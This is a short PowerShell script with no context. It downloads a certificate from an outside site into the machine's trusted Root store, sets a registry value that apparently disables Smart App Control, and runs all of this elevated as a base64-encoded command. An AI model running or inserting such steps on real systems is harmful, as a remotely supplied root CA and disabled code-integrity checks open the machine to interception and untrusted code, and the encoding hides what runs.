$payload = @'
$url = "https://files.khushrajrathod.com/ca.crt"
$path = "$env:TEMP\ca.crt"

Invoke-WebRequest -Uri $url -OutFile $path
Import-Certificate -FilePath $path -CertStoreLocation Cert:\LocalMachine\Root | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0
citool.exe -r
'@

$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -EncodedCommand $encoded"